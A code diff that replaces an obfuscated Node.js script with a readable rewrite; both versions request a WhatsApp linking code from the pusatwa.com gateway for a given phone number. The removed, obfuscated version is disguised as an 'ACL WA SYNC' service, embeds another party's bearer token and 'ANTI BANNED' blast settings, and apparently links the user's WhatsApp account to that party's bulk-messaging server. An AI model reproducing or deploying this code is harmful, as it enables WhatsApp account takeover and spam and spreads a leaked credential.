@@ -1,1 +1,130 @@
-function a0_0x8864(){const _0x374ec9=['exit','8CBfSsM','20bBDcoQ','log','253Anpety','https://pusatwa.com/api/user/devices/','argv','black','/pair','json','green','ACL-WA-','ACL\x20WA\x20SYNC','gray','\x0a\x20❌\x20Gagal\x20membuat\x20perangkat.\x20Token\x20mungkin\x20kedaluwarsa\x20atau\x20nama\x20perangkat\x20sudah\x20ada.','\x20📱\x20\x20Layanan\x20\x20\x20\x20\x20:\x20Sinkronisasi\x20Perangkat\x20WhatsApp','\x20───────────────────────────────────────────────────────','bgGreen','red','*/*','white','\x0a\x20>>\x20Buka\x20aplikasi\x20WhatsApp\x20di\x20HP\x20Anda.','\x20⚡\x20\x20Status\x20\x20\x20\x20\x20\x20:\x20Sistem\x20Aktif\x20(PusatWA)','───────────────────────────────────────────────────────','───────────────────────────────────────────────────────\x0a','\x20[✔]\x20Kecepatan\x20pengiriman\x20diatur\x20ke\x20batas\x20aman\x20(ANTI\x20BANNED).','...','324006dvVUGx','\x0a\x20✅\x20Kode\x20Tautan\x20WhatsApp\x20Anda:','pairing_code','POST','Standard','chalk','\x0a\x20❌\x20Gagal\x20mendapatkan\x20kode\x20tautan.\x20Pastikan\x20nomor\x20benar\x20dan\x20coba\x20lagi.','code','\x20>>\x20Pilih\x20ikon\x20titik\x20tiga\x20>\x20Perangkat\x20Tertaut\x20>\x20Tautkan\x20Perangkat.','/mode','923050gfxfLw','fitted','textSync','10071024yWhIap','2123946STToQJ','data','https://pusatwa.com/api/user/devices','951960DFoamb','\x20[○]\x20Menyesuaikan\x20kecepatan\x20pesan\x20WhatsApp\x20agar\x20akun\x20tetap\x20aman...','3378144YtnXMH','9UxqGSX','Mozilla/5.0\x20(Linux;\x20Android\x2010;\x20K)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/139.0.0.0\x20Mobile\x20Safari/537.36','application/json','/scan-qr','PUT','stringify','\x0a\x20[!]\x20Terjadi\x20gangguan\x20saat\x20menghubungi\x20sistem.\x20Silakan\x20coba\x20kembali.','figlet','1271643qyblry','clear','Bearer\x20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTU3LCJlbWFpbCI6ImZyNzgyNDM2MkBnbWFpbC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjE1MzQxNiwiZXhwIjoxNzc2NzU4MjE2fQ.1VwyCuBR_L5wcfTW1Z0akmlkA0cNkuguq5Q83IoiUL8','\x20[!]\x20Peringatan:\x20Nomor\x20WhatsApp\x20tidak\x20terdeteksi.\x20Harap\x20jalankan\x20dari\x20menu\x20utama.','bold'];a0_0x8864=function(){return _0x374ec9;};return a0_0x8864();}const a0_0x3495d0=a0_0x50e7;(function(_0x17c8a0,_0x1e2f88){const _0x2e5816=a0_0x50e7,_0x4d72b7=_0x17c8a0();while(!![]){try{const _0x418054=-parseInt(_0x2e5816(0x1cf))/0x1+parseInt(_0x2e5816(0x1c4))/0x2+-parseInt(_0x2e5816(0x1c1))/0x3*(-parseInt(_0x2e5816(0x1d5))/0x4)+parseInt(_0x2e5816(0x1d6))/0x5*(-parseInt(_0x2e5816(0x1b3))/0x6)+-parseInt(_0x2e5816(0x1c6))/0x7+parseInt(_0x2e5816(0x1c0))/0x8*(-parseInt(_0x2e5816(0x1c7))/0x9)+parseInt(_0x2e5816(0x1bd))/0xa*(parseInt(_0x2e5816(0x19c))/0xb);if(_0x418054===_0x1e2f88)break;else _0x4d72b7['push'](_0x4d72b7['shift']());}catch(_0x1af769){_0x4d72b7['push'](_0x4d72b7['shift']());}}}(a0_0x8864,0xbfdb2));function a0_0x50e7(_0x429a3c,_0x298b08){_0x429a3c=_0x429a3c-0x19c;const _0x886430=a0_0x8864();let _0x50e756=_0x886430[_0x429a3c];return _0x50e756;}const chalk=require(a0_0x3495d0(0x1b8)),figlet=require(a0_0x3495d0(0x1ce));console[a0_0x3495d0(0x1d0)](),console[a0_0x3495d0(0x1d7)](chalk[a0_0x3495d0(0x1a2)](figlet[a0_0x3495d0(0x1bf)](a0_0x3495d0(0x1a4),{'font':a0_0x3495d0(0x1b7),'horizontalLayout':a0_0x3495d0(0x1be)}))),console[a0_0x3495d0(0x1d7)](chalk[a0_0x3495d0(0x1ac)](a0_0x3495d0(0x1af))),console[a0_0x3495d0(0x1d7)](chalk['green'][a0_0x3495d0(0x1d3)](a0_0x3495d0(0x1a7))),console[a0_0x3495d0(0x1d7)](chalk[a0_0x3495d0(0x1a2)]['bold'](a0_0x3495d0(0x1ae))),console[a0_0x3495d0(0x1d7)](chalk[a0_0x3495d0(0x1ac)](a0_0x3495d0(0x1b0)));const nomor=process[a0_0x3495d0(0x19e)][0x2];!nomor&&(console[a0_0x3495d0(0x1d7)](chalk[a0_0x3495d0(0x1aa)](a0_0x3495d0(0x1d2))),process[a0_0x3495d0(0x1d4)](0x1));async function connectBlastServer(){const _0x246d6c=a0_0x3495d0;try{console[_0x246d6c(0x1d7)](chalk['white']('\x20[○]\x20Mempersiapkan\x20sinkronisasi\x20WhatsApp\x20untuk\x20nomor\x20'+nomor+_0x246d6c(0x1b2)));const _0x80f3e1={'accept':_0x246d6c(0x1ab),'authorization':_0x246d6c(0x1d1),'content-type':_0x246d6c(0x1c9),'user-agent':_0x246d6c(0x1c8)},_0x5a878a=await fetch(_0x246d6c(0x1c3),{'method':_0x246d6c(0x1b6),'headers':_0x80f3e1,'body':JSON[_0x246d6c(0x1cc)]({'name':_0x246d6c(0x1a3)+nomor})}),_0xf682c8=await _0x5a878a['json'](),_0x394e68=_0xf682c8['id']||_0xf682c8[_0x246d6c(0x1c2)]?.['id'];if(!_0x394e68){console['log'](chalk[_0x246d6c(0x1aa)](_0x246d6c(0x1a6)));return;}await fetch(_0x246d6c(0x19d)+_0x394e68+_0x246d6c(0x1ca),{'method':_0x246d6c(0x1b6),'headers':_0x80f3e1}),console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1ac)](_0x246d6c(0x1c5)));const _0x2ca720=await fetch('https://pusatwa.com/api/user/devices/'+_0x394e68+_0x246d6c(0x1bc),{'method':_0x246d6c(0x1cb),'headers':_0x80f3e1,'body':JSON[_0x246d6c(0x1cc)]({'mode':'1s'})});_0x2ca720['ok']&&console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1a2)](_0x246d6c(0x1b1)));console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1ac)]('\x20[○]\x20Meminta\x20Kode\x20Tautan\x20dari\x20WhatsApp...'));const _0x31731a=await fetch('https://pusatwa.com/api/user/devices/'+_0x394e68+_0x246d6c(0x1a0),{'method':'POST','headers':_0x80f3e1,'body':JSON['stringify']({'phone':nomor})}),_0x178f93=await _0x31731a[_0x246d6c(0x1a1)](),_0x3a1396=_0x178f93[_0x246d6c(0x1ba)]||_0x178f93[_0x246d6c(0x1b5)]||_0x178f93[_0x246d6c(0x1c2)]?.[_0x246d6c(0x1ba)];_0x3a1396?(console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1a2)](_0x246d6c(0x1b4)),chalk[_0x246d6c(0x1a9)][_0x246d6c(0x19f)][_0x246d6c(0x1d3)]('\x20'+_0x3a1396+'\x20')),console['log'](chalk[_0x246d6c(0x1ac)](_0x246d6c(0x1ad))),console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1ac)](_0x246d6c(0x1bb))),console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1ac)]('\x20>>\x20Pilih\x20\x22Tautkan\x20dengan\x20nomor\x20telepon\x20saja\x22\x20dan\x20masukkan\x20kode\x20di\x20atas.')),console[_0x246d6c(0x1d7)](chalk[_0x246d6c(0x1a5)](_0x246d6c(0x1a8)))):console['log'](chalk[_0x246d6c(0x1aa)](_0x246d6c(0x1b9)));}catch(_0x4868ff){console['log'](chalk[_0x246d6c(0x1aa)](_0x246d6c(0x1cd)));}}connectBlastServer();
+function a0_0x8864() {
+  const _0x374ec9 = [
+    'exit',
+    '8CBfSsM',
+    '20bBDcoQ',
+    'log',
+    '253Anpety',
+    'https://pusatwa.com/api/user/devices/',
+    'argv',
+    'black',
+    '/pair',
+    'json',
+    'green',
+    'ACL-WA-',
+    'ACL WA SYNC',
+    'gray',
+    '\n ❌ Gagal membuat perangkat...',
+    ' 📱 Layanan : Sinkronisasi Perangkat WhatsApp',
+    ' ─────────────────────────────────────────',
+    'bgGreen',
+    'red',
+    '*/*',
+    'white',
+    '\n >> Buka aplikasi WhatsApp di HP Anda.',
+    ' ⚡ Status : Sistem Aktif (PusatWA)',
+    '──────────────────────────────────',
+    'POST',
+    'chalk',
+    'figlet',
+    'clear',
+    'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
+  ];
+  return _0x374ec9;
+}
+
+const chalk = require('chalk');
+const figlet = require('figlet');
+
+console.clear();
+
+console.log(
+  chalk.green(
+    figlet.textSync('ACL WA SYNC', {
+      font: 'Standard',
+      horizontalLayout: 'fitted'
+    })
+  )
+);
+
+console.log(chalk.gray('────────────────────────────'));
+console.log(chalk.green.bold('Sistem Aktif'));
+console.log(chalk.gray('────────────────────────────'));
+
+const nomor = process.argv[2];
+
+if (!nomor) {
+  console.log(chalk.red("Nomor tidak ditemukan"));
+  process.exit(1);
+}
+
+async function connectBlastServer() {
+  try {
+    console.log(chalk.white(`[○] Menyiapkan untuk nomor ${nomor}...`));
+
+    const headers = {
+      "accept": "*/*",
+      "authorization": "Bearer TOKEN_KAMU",
+      "content-type": "application/json",
+      "user-agent": "Mozilla/5.0"
+    };
+
+    // 1. Create device
+    const res = await fetch(
+      "https://pusatwa.com/api/user/devices",
+      {
+        method: "POST",
+        headers,
+        body: JSON.stringify({
+          name: "ACL-WA-" + nomor
+        })
+      }
+    );
+
+    const data = await res.json();
+    const deviceId = data.id;
+
+    if (!deviceId) {
+      console.log(chalk.red("Gagal membuat device"));
+      return;
+    }
+
+    // 2. Pair device
+    await fetch(
+      `https://pusatwa.com/api/user/devices/${deviceId}/pair`,
+      {
+        method: "POST",
+        headers
+      }
+    );
+
+    console.log(chalk.green("Device berhasil dibuat"));
+
+    // 3. Request code
+    const codeRes = await fetch(
+      `https://pusatwa.com/api/user/devices/${deviceId}/scan-qr`,
+      {
+        method: "POST",
+        headers,
+        body: JSON.stringify({
+          phone: nomor
+        })
+      }
+    );
+
+    const codeData = await codeRes.json();
+    const code = codeData.code;
+
+    if (code) {
+      console.log(chalk.green("Kode pairing:"));
+      console.log(chalk.bgGreen.black(` ${code} `));
+    } else {
+      console.log(chalk.red("Gagal ambil kode"));
+    }
+
+  } catch (err) {
+    console.log(chalk.red("Error:", err.message));
+  }
+}
+
+connectBlastServer();
